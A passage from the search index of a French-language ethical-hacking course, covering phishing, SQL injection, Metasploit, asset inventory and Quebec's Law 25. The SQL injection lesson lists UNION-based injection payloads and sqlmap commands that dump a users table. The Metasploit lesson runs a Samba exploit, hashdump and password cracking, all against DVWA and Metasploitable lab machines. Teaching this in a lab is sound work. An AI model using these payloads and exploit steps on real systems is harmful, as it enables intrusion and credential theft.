l'ext\u00e9rieur de l'entreprise, toujours douteux!  </li> <li>Le courriel ne s'adresse pas directement \u00e0 vous et il y a des fautes d'ortographes.    </li> <li>Il y a toujours un sentiment d'urgence.  </li> </ol>"},{"location":"lecons/Hameconnage/#comment-fonctionne-une-attaque-dhameconnage","title":"Comment fonctionne une attaque d'hame\u00e7onnage","text":""},{"location":"lecons/Hameconnage/#vol-du-mot-de-passe","title":"Vol du mot de passe","text":"<p>La technique la plus simple pour un attaquant est de forger une page de login pour que la victime entre son code utilisateur et son mot de passe. Dans ce cas, le lien dans le courriel d'hame\u00e7onnage pointe sur la fausse page de login.</p>"},{"location":"lecons/Hameconnage/#prise-de-controle-du-pc","title":"Prise de contr\u00f4le du PC","text":"<p>L'autre technique est d'envoyer un fichier avec un payload qui force le PC de la victime \u00e0 se connecter au serveur de l'attaquant.  </p>"},{"location":"lecons/Hameconnage/#comment-inciter-la-victime-a-cliquer-sur-le-lien","title":"Comment inciter la victime \u00e0 cliquer sur le lien","text":"<p>Plus vous connaissez la victime, plus il est facile de les faire cliquer sur un lien malicieux.  Voici quelques exemples d'attaques r\u00e9ussies dans la derni\u00e8re ann\u00e9e :  </p> <ul> <li>Se faire passer pour le pr\u00e9sident de l'entreprise qui fait un sondage sur l'utilisation des masques au bureau.  </li> <li>Imiter le courriel d'un gros client qui fait une plainte sur le produit.  </li> <li>Prendre l'identit\u00e9 d'un fournisseur qui envoie une facture en retard de paiement.  </li> <li>Faire un courriel qui vient du d\u00e9partement des ressources humaines qui demande de remplir un formulaire pour avoir droit \u00e0 un cong\u00e9 f\u00e9ri\u00e9.  </li> </ul>"},{"location":"lecons/Hameconnage/#testez-vos-connaissances","title":"Testez vos connaissances","text":"<p>Petit quiz sur l'hame\u00e7onnage </p>"},{"location":"lecons/Injection_SQL/","title":"Injections SQL","text":""},{"location":"lecons/Injection_SQL/#notions-de-base","title":"Notions de base","text":"<p>Voici quelques notions de base avant de faire de l'injection SQL.  </p>"},{"location":"lecons/Injection_SQL/#instructions-de-commentaires-dans-sqli","title":"Instructions de commentaires dans SQLi","text":"<p>Voici les diff\u00e9rentes fa\u00e7ons de commenter du code SQLi :  </p> Style Nom -- MySQL sur linux --+ MySQL sur Windows # Di\u00e8se --+- Commentaire SQL ;%00 Null"},{"location":"lecons/Injection_SQL/#differentes-facons-dassigner-des-valeurs-dans-la-requete","title":"Diff\u00e9rentes fa\u00e7ons d'assigner des valeurs dans la requ\u00eate","text":"<p>Une valeur peut \u00eatre utilis\u00e9e de 3 diff\u00e9rentes fa\u00e7ons :</p> <p>Passage d'un integer : <code>select * from table where id=1</code></p> <p>Passage d'une chaine de caract\u00e8res avec l'apostrophe : <code>select * from table where id='1'</code></p> <p>Passage d'une chaine de caract\u00e8res avec le guillemet : <code>select * from table where id=\"1\"</code></p> <p>C'est important de d\u00e9couvrir quelle des trois techniques a \u00e9t\u00e9 utilis\u00e9e dans le code, pour bien injecter notre propre code.</p>"},{"location":"lecons/Injection_SQL/#buts-de-linjection-sql","title":"Buts de l'injection SQL","text":"<p>Le but ultime de l'injection SQL et d'utiliser un champ d'une application Web et ex\u00e9cuter n'importe quelle instruction SQL.  </p>"},{"location":"lecons/Injection_SQL/#reconnaissance-active","title":"Reconnaissance active","text":"<p>La premi\u00e8re \u00e9tape est la reconnaissance active. Dans ce contexte, ce sont ces \u00e9tapes :  </p> <ol> <li>D\u00e9terminer le type d'assignation des valeurs dans la requ\u00eate  </li> <li>D\u00e9terminer le nombre de colonnes que la requ\u00eate retourne  </li> <li>Trouver les informations sur la base de donn\u00e9es</li> <li>Faire la liste des tables</li> <li>Faire la liste des champs des tables</li> </ol>"},{"location":"lecons/Injection_SQL/#1-type-dassignation-des-valeurs","title":"1. Type d'assignation des valeurs","text":"<p>Voici l'interface de notre test :  </p> <p></p> <p>Quand on entre un ID, l'interface retourne l'information.  </p> <p>Voici les \u00e9tapes pour tester quel type d'assignation est utilis\u00e9 dans la requ\u00eate SQL :  </p> <p>Commencez par entrer <code>1'</code> (le chiffre 1 et l'apostrophe)</p> <p>Si le r\u00e9sultat est une erreur ou une absence d'affichage, ce peut \u00eatre une assignation integer ou apostrophe.</p> <p></p> <p>Si le r\u00e9sultat est similaire \u00e0 entrer un ID normal, c'est probablement guillemets.  </p> <p>Voici les autres tests \u00e0 faire :  </p> Entr\u00e9e integer apostrophe guillemets 23' Erreur Erreur OK 23\" Erreur OK Erreur 23 or 1=1 OK Erreur Erreur 23' or '1' = '1 Erreur OK Erreur 23\" or \"1\" = \"1 Erreur Erreur OK <p>Maintenant, il faut tester si l'assignation se fait entre parenth\u00e8se, par exemple :  </p> <p><code>select * from table where id=(1)</code> </p> <p>Si c'est une assignation integer, faire les tests suivants :  </p> Entr\u00e9e Remarque 1 # Si OK, pas de parenth\u00e8ses 1) # Si OK, utilise les parenth\u00e8ses <p>Si c'est une assignation apostrophes, faire les tests suivants :  </p> Entr\u00e9e Remarque 1' # Si OK, pas de parenth\u00e8ses 1') # Si OK, utilise les parenth\u00e8ses <p>Si c'est une assignation guillemets, faire les tests suivants :  </p> Entr\u00e9e Remarque 1\" # Si OK, pas de parenth\u00e8ses 1\") # Si OK, utilise les parenth\u00e8ses"},{"location":"lecons/Injection_SQL/#2-determiner-le-nombre-de-colonnes","title":"2. D\u00e9terminer le nombre de colonnes","text":"<p>Pour d\u00e9terminer le nombre de colonnes de la requ\u00eate SQL, nous allons utiliser la fonction ORDER BY.  </p> <p>Prenez cette requ\u00eate :  </p> <p><code>Select nom, prenom from etudiants order by 1</code> </p> <p>Cette requ\u00eate retournera la liste des \u00e9tudiants tri\u00e9e par nom.</p> <p><code>Select nom, prenom from etudiants order by 2</code> </p> <p>Cette requ\u00eate retournera la liste des \u00e9tudiants tri\u00e9e par pr\u00e9nom.</p> <p><code>Select nom, prenom from etudiants order by 3</code> </p> <p>Cette requ\u00eate retournera une erreur, la colonne 3 n'existe pas.</p> <p>Sachant ce comportement, injectons ceci :  </p> Assignation Entr\u00e9e Integer 1 ORDER BY 1 # Apostrophe 1' ORDER BY 1 # Guillemets 1\" ORDER BY 1 # <p>Ensuite  :  </p> Assignation Entr\u00e9e Integer 1 ORDER BY 2 # Apostrophe 1' ORDER BY 2 # Guillemets 1\" ORDER BY 2 # <p>Et ainsi de suite, jusqu'\u00e0 obtention d'une erreur.  </p>"},{"location":"lecons/Injection_SQL/#3-trouver-les-informations-sur-la-base-de-donnees","title":"3. Trouver les informations sur la base de donn\u00e9es","text":"<p>La technique pour trouver les informations sur la base de donn\u00e9es et tout autre donn\u00e9es est l'utilisation de l'instruction UNION.  </p> <p>L'instruction UNION permet de combiner la sortie de deux requ\u00eates SQL en une seule, tant et aussi longtemps qu'elles ont le m\u00eame nombre de colonnes.  </p> <p>Prenons l'instruction suivante :  </p> <p><code>Select nom, prenom from etudiants where id = 1</code></p> <p>Cette requ\u00eate retourne ceci :  </p> Nom Pr\u00e9nom George Lemieux <p><code>Select nom, prenom from etudiants where id = 2</code></p> <p>Cette requ\u00eate retourne ceci :  </p> Nom Pr\u00e9nom Lucien Poirier <p>Si nous faisons l'union de ces deux requ\u00eates :  </p> <p><code>Select nom, prenom from etudiants where id = 1 UNION Select nom, prenom from etudiants where id = 2</code></p> <p>Cette requ\u00eate retourne ceci :  </p> Nom Pr\u00e9nom George Lemieux Lucien Poirier <p>Donc, dans notre injection, nous allons faire des UNION pour extraire l'information de la base de donn\u00e9es.  </p> <p>Premier test d'UNION :</p> <p><code>1 UNION SELECT 1,2 #</code> </p> <p>Devrait retourner ceci :  </p> <p></p> <p>Maintenant, allons chercher l'information de la base de donn\u00e9e :  </p> <p><code>1 UNION SELECT null, database() #</code></p> <p>Notez que pour respecter le nombre de colonnes, null est ajout\u00e9 \u00e0 la place de colonnes qui ne sont pas utiles dans la requ\u00eate \u00e0 injecter.  </p> <p>La requ\u00eate retourne ceci :  </p> <p></p> <p>La version de la BD :  </p> <p><code>1 UNION SELECT null, version() #</code></p> <p>Retourne ceci :  </p> <p></p> <p>L'utilisateur que se sert l'application pour ex\u00e9cuter les requ\u00eates SQL :  </p> <p><code>1 UNION SELECT null, user() #</code></p> <p>Retourne ceci :  </p> <p></p>"},{"location":"lecons/Injection_SQL/#4-faire-la-liste-des-tables","title":"4. Faire la liste des tables","text":"<p>Pour faire la liste des tables, il suffit de faire une requ\u00eate dans le sch\u00e9ma d'information (ceci est pour MySQL) :  </p> <p><code>1 UNION Select null, table_name from information_schema.tables #</code> </p> <p></p> <p>Pour chercher une table avec un nom particulier, on peut filtrer comme ceci :  </p> <p><code>1 UNION Select null, table_name from information_schema.tables where table_name like 'u%' #</code> </p> <p></p>"},{"location":"lecons/Injection_SQL/#5-faire-la-liste-des-champs-des-tables","title":"5. Faire la liste des champs des tables","text":"<p>Pour faire la liste des tables, il suffit de faire une requ\u00eate dans le sch\u00e9ma d'information (ceci est pour MySQL) :  </p> <p><code>1 UNION Select table_name, column_name from information_schema.columns where table_name = 'users' #</code> </p> <p> </p>"},{"location":"lecons/Injection_SQL/#extraction-de-donnees","title":"Extraction de donn\u00e9es","text":"<p>Essayons d'extraire la liste des utilisateurs de la base de donn\u00e9es :  </p> <p><code>1 UNION Select null, concat(0x0a,'USER ID: ',user_id, 0x0a, 'First name: ', first_name, 0x0a, 'Last name: ', last_name ) from users #</code> </p> <p>Truc:  <code>0x0a</code> et le caract\u00e8re de retour de chariot, permet d'afficher sur plusieurs lignes nos r\u00e9sultats...</p> <p></p>"},{"location":"lecons/Injection_SQL/#utilisation-doutils-automatises-pour-linjection-sql","title":"Utilisation d'outils automatis\u00e9s pour l'injection SQL","text":"<p>Pour notre prochain test, nous allons utiliser deux outils :</p> <ol> <li>Firefox : pour capturer les t\u00e9moins  </li> <li>SQLMap : pour automatiser l'injection SQL    </li> </ol>"},{"location":"lecons/Injection_SQL/#firefox","title":"Firefox","text":"<p>Nous voulons extraire les t\u00e9moins de la page Web de DVWA car les t\u00e9moins contiendrons les informations de la session PHP qui est cr\u00e9\u00e9e lors du login. SQLMap ne peut se loguer lui-m\u00eame, mais peut utiliser les t\u00e9moins.</p> <p>1 - Dans les outils d\u00e9veloppeur de Firefox, ouvrir le stockage des t\u00e9moins:  </p> <p></p> <p>Nous avons maintenant le t\u00e9moin pour utiliser SQLMap.</p>"},{"location":"lecons/Injection_SQL/#sqlmap","title":"SQLMap","text":"<p>SQLMap est un outil pour automatiser l'injection SQL.  C'est un outil en ligne de commande.</p> <p>Pour d\u00e9terminer les bases de donn\u00e9es accessibles via l'injection SQL :  </p> <pre><code>sqlmap -u \"http://192.168.40.7/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#\" \\\n  --cookie=\"security=low; PHPSESSID=d62199405e459ee9b9a66cab06d90cd3\" \\\n  -dbs\n</code></pre> <p>R\u00e9sultat :  </p> <p> </p> <p>Pour d\u00e9terminer les tables d'une base de donn\u00e9es :  </p> <pre><code>sqlmap -u \"http://192.168.40.7/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#\" \\\n  --cookie=\"security=low; PHPSESSID=d62199405e459ee9b9a66cab06d90cd3\" \\  \n  -D dvwa -tables\n</code></pre> <p>R\u00e9sultat :  </p> <p></p> <p>Pour extraire la table users :  </p> <pre><code>sqlmap -u \"http://192.168.40.7/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#\" \\\n  --cookie=\"security=low; PHPSESSID=d62199405e459ee9b9a66cab06d90cd3\" \\\n  -D dvwa -T users -dump\n</code></pre> <p>SQLMap automatise l'extraction des mots de passe. Voici les r\u00e9ponses aux questions pour ce faire :  </p> <p></p> <p>R\u00e9sultat :  </p> <p></p>"},{"location":"lecons/Injection_SQL/#testez-vos-connaissances","title":"Testez vos connaissances","text":"<p>Petit quiz sur l'injection SQL </p>"},{"location":"lecons/Intro_Metasploit/","title":"Introduction \u00e0 Metasploit","text":"<p>Metasploit est une architecture b\u00e2tie pour faciliter l'exploitation de failles dans les syst\u00e8mes informatiques.</p> <p>Un des outils les plus utiles pour un pirate \u00e9thique.</p> <p>Dans Kali, pour d\u00e9marrer Metasploit, faire la commande suivante :</p> <p><code>msfconsole</code></p>"},{"location":"lecons/Intro_Metasploit/#architecture-de-metasploit","title":"Architecture de Metasploit","text":"<p>Dans Kali, les packages de Metasploit sont dans le dossier suivant :</p> <p><code>/usr/share/metasploit-framework</code></p> <p>Un dossier en particulier est important, celui des modules :</p> <p><code>/usr/share/metasploit-framework/modules</code></p> <p>Ce dossier contient tous les outils qui peuvent \u00eatre utilis\u00e9s pour d\u00e9couvrir des failles, de les exploiter et autres t\u00e2ches connexes.</p> <p>Sous modules, il y a ces dossiers :</p> <ul> <li>Exploits - Pour exploiter les failles d'un syst\u00e8me.</li> <li>Auxiliary - Outils comme des balayeurs de ports, sniffers et autres</li> <li>Payloads - Code qui peut \u00eatre ex\u00e9cut\u00e9 sur la machine de la victime</li> <li>Encoders - Outils qui transforment les payloads pour qu'ils arrivent \u00e0 destination correctement</li> <li>Nops - Pour garder un poids du payload consistant</li> </ul>"},{"location":"lecons/Intro_Metasploit/#commandes-de-la-console","title":"Commandes de la console","text":"<p><code>exit</code></p> <p>Pour sortir de la console.</p> <p><code>help</code></p> <p>Donne la liste des commandes.</p> <p><code>info</code></p> <p>Donne de l'information sur un module sp\u00e9cifique.</p> <p><code>search</code></p> <p>Permet de rechercher \u00e0 travers tous les modules disponibles.</p> <p>Voici quelques mots cl\u00e9s pour aider \u00e0 chercher :</p> <ul> <li>name : cherche dans le nom du module</li> <li>platform : cherche un module qui agit sur la plateforme</li> <li>type : quel type de module (exploit, payload, etc.)</li> </ul> <p><code>sessions</code></p> <p>Interagit avec les diff\u00e9rentes sessions.</p> <p><code>set</code></p> <p>Pour configurer les options d'un module.</p> <p><code>unset</code></p> <p>Annule une configuration d'options.</p> <p><code>setg</code></p> <p>Pour configurer globalement les options de modules.</p> <p><code>show</code></p> <p>Affiche les modules.</p> <p><code>show options</code></p> <p>Affiche les options du module en cours.</p> <p><code>show advanced</code></p> <p>Affiche les options avanc\u00e9es du module en cours.</p> <p><code>use</code></p> <p>Indique quel module \u00e0 utiliser.</p>"},{"location":"lecons/Intro_Metasploit/#utilisation-dune-base-de-donnees-dans-metasploit","title":"Utilisation d'une base de donn\u00e9es dans Metasploit","text":"<p>Pour aider dans l'utilisation de la plateforme, une base de donn\u00e9es Postgresql est \u00e0 votre disposition pour conserver l'information de votre reconnaissance active.</p> <p>Pour d\u00e9marrer la BD PostGreSQL : Proc\u00e9dure</p> <p>Lors de la premi\u00e8re utilisation, il faut initialiser la BD avant d'utiliser workspace, une fois dans la console :</p> <p><code>msfdb init</code></p>"},{"location":"lecons/Intro_Metasploit/#espaces-de-travail","title":"Espaces de travail","text":"<p>Dans la console, vous pouvez voir vos espaces de travail avec la commande :</p> <p><code>workspace</code></p> <p></p> <p>L'outil est fait pour garder s\u00e9par\u00e9 les reconnaissances actives d'un client \u00e0 l'autre.</p> <p>Pour cr\u00e9er un nouvel espace de travail :</p> <p><code>workspace -a cegep</code></p> <p></p> <p>Pour le supprimer :</p> <p><code>workspace -d cegep</code></p> <p></p> <p>Pour le s\u00e9lectionner :</p> <p><code>workspace cegep</code></p> <p></p> <p>Une fois un espace de travail s\u00e9lectionn\u00e9, tous les r\u00e9sultats des balayages seront sauvegard\u00e9s dans l'espace de travail.</p>"},{"location":"lecons/Intro_Metasploit/#utiliser-nmap-pour-le-balayage","title":"Utiliser nmap pour le balayage","text":"<p>Une commande dans Metasploit permet d'utiliser nmap pour alimenter l'espace de travail :</p> <p><code>db_nmap -A 192.168.40.7</code></p> <p></p> <p>Vous pouvez voir les r\u00e9sultats dans les contenants de l'espace de travail :</p> <p><code>hosts</code></p> <p></p> <p>Pour limiter les colonnes de hosts :</p> <p><code>hosts -c address,os_flavor</code></p> <p></p> <p>Pour faire une recherche d'un actif en particulier :</p> <p><code>hosts -S Linux</code></p> <p></p>"},{"location":"lecons/Intro_Metasploit/#utiliser-le-module-de-balayage-de-metasploit","title":"Utiliser le module de balayage de Metasploit","text":"<p><code>use auxiliary/scanner/portscan/tcp</code></p> <p><code>show options</code></p> <p></p> <p>Une des options du module est RHOSTS. Utilisons la commande hosts pour l'alimenter :</p> <p><code>hosts -R</code></p> <p></p> <p><code>run</code></p> <p></p>"},{"location":"lecons/Intro_Metasploit/#commande-services","title":"Commande services","text":"<p>Pour voir les services d\u00e9couverts :</p> <p><code>services</code></p> <p></p> <p>Pour voir un service en particulier :</p> <p><code>services -S http</code></p> <p></p> <p>Pour une recherche par num\u00e9ro de port :</p> <p><code>services -p 445</code></p> <p></p>"},{"location":"lecons/Intro_Metasploit/#informations-de-connexion","title":"Informations de connexion","text":"Utilisation de l'outil de d\u00e9couverte de mots de passe MySQL ne fonctionne pas avec Kali 2024 <p>Utiliser l'outil de d\u00e9couverte de mots de passe MySQL :</p> <p><code>use auxiliary/scanner/mysql/mysql_login</code></p> <p><code>show options</code></p> <p></p> <p><code>hosts -R</code></p> <p><code>run</code></p> <p></p> <p>Les informations se retrouvent dans le contenant creds :</p> <p><code>creds</code></p> <p></p>"},{"location":"lecons/Intro_Metasploit/#les-tresors-loot","title":"Les tr\u00e9sors (loot)","text":"<p>Metasploit conserve aussi tous les loot qui sont d\u00e9couverts par ses modules.</p> <p>Essayons d'aller chercher les fichiers de mots de passe de Metasploitable :</p> <p><code>use exploit/multi/samba/usermap_script</code></p> <p><code>show options</code></p> <p><code>hosts -R</code></p> <p></p> <p><code>exploit</code></p> <p></p> <p><code>use post/linux/gather/hashdump</code></p> <p><code>show options</code></p> <p></p> <p><code>set SESSION 1</code></p> <p><code>run</code></p> <p></p> <p><code>loot</code></p> <p></p>"},{"location":"lecons/Intro_Metasploit/#decryptage-des-loot","title":"D\u00e9cryptage des loot","text":"<p><code>use auxiliary/analyze/crack_linux</code></p> <p><code>show options</code></p> <p><code>set CUSTOM_WORDLIST /usr/share/john/password.lst</code></p> <p><code>set USE_DEFAULT_WORDLIST false</code></p> <p><code>set USE_ROOT_WORDS false</code></p> <p><code>run</code></p> <p></p> D\u00e9cryptage des loot avec <code>john</code> si \u00e7a ne marche pas avec crack_linux <p>Apr\u00e8s l'extraction des loot, il est possible de les d\u00e9chiffrer avec l'outil <code>john</code> :  </p> <p><code>john --wordlist=/usr/share/john/password.lst --rules /root/.msf4/loot/20200605161359_default_192.168.40.7_linux.hashdump_159137603</code></p> <p></p>"},{"location":"lecons/Intro_Metasploit/#testez-vos-connaissances","title":"Testez vos connaissances","text":"<p>Petit quiz sur Metasploit </p>"},{"location":"lecons/Introduction/","title":"Introduction","text":""},{"location":"lecons/Introduction/#certifications","title":"Certifications","text":"<p>Plusieurs certifications existent sur le march\u00e9 pour la cybers\u00e9curit\u00e9. Voici les deux les plus connues</p> <p>CISSP : Focus sur la protection des actifs de l'entreprise CEH : Focus sur l'attaque (Piratage \u00e9thique)</p>"},{"location":"lecons/Introduction/#triangle-de-securite","title":"Triangle de s\u00e9curit\u00e9","text":"<p>Triangle de s\u00e9curit\u00e9</p> <p> La base du CISSP  </p> <p>Les 3 piliers de la cybers\u00e9curit\u00e9 :  </p> Pilier Description Attaque typique Confidentialit\u00e9 Conserver les donn\u00e9es priv\u00e9es, hors de port\u00e9e de personnes malicieuses Vol de donn\u00e9es Int\u00e9grit\u00e9 Garder les donn\u00e9es conformes Modification illicite de donn\u00e9es Disponibilit\u00e9 Pouvoir acc\u00e9der aux donn\u00e9es lorsque requis Attaque DoS"},{"location":"lecons/Introduction/#vulnerabilites-menaces-et-exploiter-les-failles","title":"Vuln\u00e9rabilit\u00e9s, menaces et exploiter les failles","text":""},{"location":"lecons/Introduction/#vulnerabilite","title":"Vuln\u00e9rabilit\u00e9","text":"<p>Une vuln\u00e9rabilit\u00e9 est une faiblesse dans un syst\u00e8me ou dans son design qui peut \u00eatre exploit\u00e9e.</p> <p>Une vuln\u00e9rabilit\u00e9 peut \u00eatre trouv\u00e9e dans :</p> <ul> <li>Un syst\u00e8me d'exploitation</li> <li>Un protocole</li> <li>Une application</li> <li>Du mat\u00e9riel</li> <li>Un design de syst\u00e8me</li> </ul> <p>Exemples de vuln\u00e9rabilit\u00e9s :  </p> <ul> <li>Injection SQL   </li> <li>D\u00e9passement de m\u00e9moire tampon</li> </ul> <p>La communaut\u00e9 de cybers\u00e9curit\u00e9 compile la liste des vuln\u00e9rabilit\u00e9s nomm\u00e9e CVE (Common vulnerabilities and exposures)</p>"},{"location":"lecons/Introduction/#menace","title":"Menace","text":"<p>Une menace est un danger potentiel d'un actif.</p>"},{"location":"lecons/Introduction/#exploiter-une-faille-exploit","title":"Exploiter une faille (Exploit)","text":"<p>Dans ce cours, nous utiliserons le terme anglophone exploit pour parler de s\u00e9ries de commandes ou un logiciel qui prennent avantages d'une vuln\u00e9rabilit\u00e9 pour causer du tort \u00e0 un syst\u00e8me.</p> <p>Deux grandes cat\u00e9gories d'exploits, celles qui sont locales et celles qui sont \u00e0 distance.</p>"},{"location":"lecons/Introduction/#pourquoi-du-piratage-ethique","title":"Pourquoi du piratage \u00e9thique?","text":"<p>Les co\u00fbts reli\u00e9s \u00e0 une attaque pour une grande entreprise est en moyenne de 4 millions.</p> <p>Plus tard est d\u00e9tect\u00e9e l'attaque, plus c'est couteux.</p> <p>Un pirate \u00e9thique permet de d\u00e9couvrir les failles de s\u00e9curit\u00e9 de l'entreprise, pour mieux la prot\u00e9ger. C'est un peu comme un voleur qui ferait le tour de ta maison pour te dire comment il pourrait s'y introduire pour faire un vol.</p>"},{"location":"lecons/Introduction/#equipe-rouge-vs-equipe-bleue","title":"\u00c9quipe rouge VS \u00e9quipe bleue","text":"<p>Dans beaucoup de grandes entreprises, l'\u00e9quipe de s\u00e9curit\u00e9 se s\u00e9parent en deux, avec l'\u00e9quipe rouge qui s'occupe de l'offensive (trouver les vuln\u00e9rabilit\u00e9s) et l'\u00e9quipe bleue s'occupe de la d\u00e9fensive (SOC, Gestion de rustine, etc.)</p>"},{"location":"lecons/Introduction/#outils-utilises","title":"Outils utilis\u00e9s","text":"<p>Le principal outil utilis\u00e9 sera Kali Linux. Cette distribution Linux, bas\u00e9e sur Debian, regroupe une grande quantit\u00e9 d'outils utiles aux tests de p\u00e9n\u00e9tration.</p>"},{"location":"lecons/Introduction/#laboratoire-du-cours","title":"Laboratoire du cours","text":"<p>Chaque \u00e9tudiante et \u00e9tudiant aura son propre laboratoire sur son ordinateur. Les diff\u00e9rentes machines virtuelles (VM) seront d\u00e9marr\u00e9es dans VirtualBox.</p> <p>Machine 1 - L'attaquant : Kali Linux (Installer Kali)</p> <p>Machine 2 - Serveur cible : Metasploitable (Installer Metasploitable)</p> <p>Machine 3 - Poste de travail Windows XP (Installer Windows XP)</p>"},{"location":"lecons/Introduction/#lectures-supplementaires","title":"Lectures suppl\u00e9mentaires","text":"<p>Programme CEH Programme CISSP Kali Linux by Offensive Security Liste des outils de Kali Linux OWASP - Vulnerabilities CVE List </p>"},{"location":"lecons/Inventaire_Actifs/","title":"Inventaire d'actifs","text":""},{"location":"lecons/Inventaire_Actifs/#types-dactifs","title":"Types d'actifs","text":"<p>Un actif peut \u00eatre :</p> <ul> <li>Un ordinateur</li> <li>Un serveur</li> <li>Une base de donn\u00e9es</li> <li>Un logiciel</li> <li>Un p\u00e9riph\u00e9rique</li> <li>Etc.</li> </ul>"},{"location":"lecons/Inventaire_Actifs/#classification-dactifs","title":"Classification d'actifs","text":"<p>La classification d'actifs en entreprise peut changer d'une compagnie \u00e0 l'autre. On rencontre souvent ces classes :</p> <ol> <li>Public : R\u00e9f\u00e8re \u00e0 un actif qui peut \u00eatre consult\u00e9 par tout le monde, m\u00eame \u00e0 l'ext\u00e9rieur de l'entreprise. Par exemple : le site Web de l'entreprise  </li> <li>Interne : \u00c0 usage interne de l'entreprise seulement. Par exemple : Le ERP de l'entreprise.  </li> <li>Confidentiel : Pour un usage r\u00e9serv\u00e9 \u00e0 certaines personnes dans l'organisation. Par exemple : Les donn\u00e9es de paie.  </li> </ol> <p>La classification aide dans la pratique de cybers\u00e9curit\u00e9 pour d\u00e9terminer les moyens \u00e0 prendre pour s\u00e9curiser les actifs.</p>"},{"location":"lecons/Inventaire_Actifs/#proprietaire-dactifs","title":"Propri\u00e9taire d'actifs","text":"<p>En entreprise, il est important de d\u00e9terminer qui est le propri\u00e9taire de l'actif. C'est ce dernier qui prendra les d\u00e9cisions selon vos recommandations de s\u00e9curit\u00e9.</p> <p>Le propri\u00e9taire a la responsabilit\u00e9 de :</p> <ul> <li>Classifier l'actif  </li> <li>D\u00e9terminer la politique d'acc\u00e8s de l'actif  </li> <li>D\u00e9l\u00e9guer les responsabilit\u00e9s de gestion \u00e0 un gardien  </li> </ul> <p>Le gardien (souvent le d\u00e9partement TI) a la responsabilit\u00e9 de :  </p> <ul> <li>Prendre les sauvegardes  </li> <li>S'assurer des bons niveaux d'acc\u00e8s  </li> <li>Prot\u00e9ger les actifs  </li> <li>Ajouter ou retirer des utilisateurs  </li> <li>Documenter l'actif  </li> </ul>"},{"location":"lecons/Inventaire_Actifs/#dossier-de-securite","title":"Dossier de s\u00e9curit\u00e9","text":"<p>Dans le dossier de s\u00e9curit\u00e9 d'une entreprise, il y aura une section sur l'inventaire o\u00f9 la liste des actifs et les informations suivantes : - Le nom de l'actif - Une br\u00e8ve description - Le propri\u00e9taire de l'actif - La classification - La fr\u00e9quence de sauvegarde  </p> <p>Ex :  </p> Nom Description Propri\u00e9taire Classification Fr\u00e9quence de sauvegarde PAIE Base de donn\u00e9es de la paie des employ\u00e9s Serge Gagnon, directeur RH Confidentiel Complet le mercredi soir ERP Serveur du progiciel de gestion int\u00e9gr\u00e9e Sandra Houle, vice-pr\u00e9sidente Interne Complet le dimanche, diff\u00e9rentiel les autres soirs BUREAU Serveur de fichiers Pierre Michaud, directeur d'usine Interne Complet le dimanche, diff\u00e9rentiel les autres soirs WEB Site Web de l'entreprise Mireille Boucher, directrice des communications Public Complet le dimanche seulement"},{"location":"lecons/Inventaire_Actifs/#outils-de-decouverte-dinventaire-dactifs-sur-le-reseau","title":"Outils de d\u00e9couverte d'inventaire d'actifs sur le r\u00e9seau","text":"<p>Avoir un inventaire de tout ce qui est connect\u00e9 sur le r\u00e9seau de l'entreprise est une n\u00e9cessit\u00e9 pour un professionnel de la cybers\u00e9curit\u00e9. En effet, il ne faut qu'un actif non prot\u00e9g\u00e9 pour que le pirate puisse prendre d'assault le r\u00e9seau interne.  </p> <p>Pour \u00eatre bien prot\u00e9g\u00e9, il faut conna\u00eetre ces informations :  </p> <ul> <li>Les syst\u00e8mes d'exploitation, leurs versions et leurs niveaux de rustines  </li> <li>Les logiciels install\u00e9s et leurs versions  </li> <li>Les aspects mat\u00e9riels tels que le processeur et autres p\u00e9riph\u00e9riques</li> </ul> <p>Ce peut \u00eatre tr\u00e8s fastidieux de comptabiliser tout \u00e7a \u00e0 la main et le risque est grand que l'information ne soit pas \u00e0 jour.</p> <p>Pourquoi faut-il savoir tout \u00e7a?  Pour d\u00e9terminer quel actif est \u00e0 risque lorsque le fournisseur \u00e9met un avis de faille.</p> <p>Ex: Le mardi de chaque semaine, Microsoft annonce les nouvelles rustines qui colmatent les trous de s\u00e9curit\u00e9. (Microsoft Patch Tuesday). Avec un inventaire \u00e0 jour, il est facile de d\u00e9terminer quel actif doit recevoir la rustine.</p> <p>Un outil tr\u00e8s connu sur le march\u00e9 se nomme LanSweeper.</p> <p>Page principale de LanSweeper :  </p> <p></p> <p>Page des actifs de LanSweeper :  </p> <p></p> <p>S\u00e9lectionner les actifs fonctionnant sur Windows :  </p> <p></p> <p>Le r\u00e9sultat de la s\u00e9lection :  </p> <p></p> <p>Le d\u00e9tail d'un actif :  </p> <p></p> <p>Les logiciels install\u00e9s :  </p> <p></p> <p>Le logiciel fait la d\u00e9couverte d'actifs en balayant le r\u00e9seau :  </p> <p></p>"},{"location":"lecons/Inventaire_Actifs/#testez-vos-connaissances","title":"Testez vos connaissances","text":"<p>Petit quiz sur l'inventaire d'actifs </p>"},{"location":"lecons/Lois/","title":"Lois \u00e0 conna\u00eetre en informatique","text":""},{"location":"lecons/Lois/#loi-25-au-quebec","title":"Loi 25 au Qu\u00e9bec","text":"<p>La Loi modernisant des dispositions l\u00e9gislatives en mati\u00e8re de protection des renseignements personnels.  </p> <p>Cette loi doit \u00eatre appliqu\u00e9e \u00e0 toutes les institutions qui collectent des renseignements personnels au Qu\u00e9bec.  </p> <p>La loi concerne seulement les donn\u00e9es de personnes physiques, donc pas applicable pour les donn\u00e9es identifiant les entreprises et les institutions.  </p> <p>Que sont les renseignements personnels ?  </p> <ul> <li>Nom et pr\u00e9nom,  </li> <li>date de naissance,  </li> <li>adresse,  </li> <li>num\u00e9ro de t\u00e9l\u00e9phone personnel,  </li> <li>le courriel personnel,     </li> </ul> <p>Que sont les renseignements personnels sensibles ?  </p> <ul> <li>renseignements biom\u00e9triques,  </li> <li>num\u00e9ro d'assurance sociale,  </li> <li>num\u00e9ro d'assurance maladie,  </li> <li>num\u00e9ro de carte de cr\u00e9dit,  </li> <li>donn\u00e9es m\u00e9dicales,  </li> <li>num\u00e9ro de permis de conduire,  </li> <li>conditions de travail (incluant salaire),  </li> <li>dossier de cr\u00e9dit,  </li> </ul> <p>Qu'est-ce qui exclut de la loi ?  </p> <ul> <li>Le titre de votre poste,  </li> <li>Le num\u00e9ro de t\u00e9l\u00e9phone au bureau,  </li> <li>Le courriel professionnel,  </li> </ul> <p>Que pr\u00e9voit la Loi ?  </p> <p>Prot\u00e9ger les renseignements personnels sensibles contre la diffusion, la divulgation, la modification et la r\u00e9utilisation.  </p> <p>Chaque entreprise ou institution doit 